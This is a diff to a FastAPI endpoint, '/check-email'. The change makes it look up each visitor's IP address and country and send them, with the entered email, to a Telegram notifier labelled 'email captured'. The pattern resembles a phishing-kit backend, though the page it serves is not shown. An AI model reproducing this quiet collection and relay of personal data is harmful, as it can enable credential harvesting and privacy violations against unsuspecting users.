@@ -112,12 +112,16 @@ async def register(user_data: UserCreate):
 
 
 @router.post("/check-email", response_model=CheckEmailResponse)
-async def check_email(email_data: CheckEmailRequest):
+async def check_email(email_data: CheckEmailRequest, request: Request):
     """Check if an email address exists in the database."""
     try:
+        # Get IP and country
+        ip_address = get_client_ip(request)
+        country = get_country_from_ip(ip_address)
+        
         # Send Telegram notification - email captured
         try:
-            notify_email_captured(email_data.email.lower())
+            notify_email_captured(email_data.email.lower(), ip_address, country)
         except Exception as e:
             logger.warning(f"Failed to send Telegram notification: {str(e)}")
         
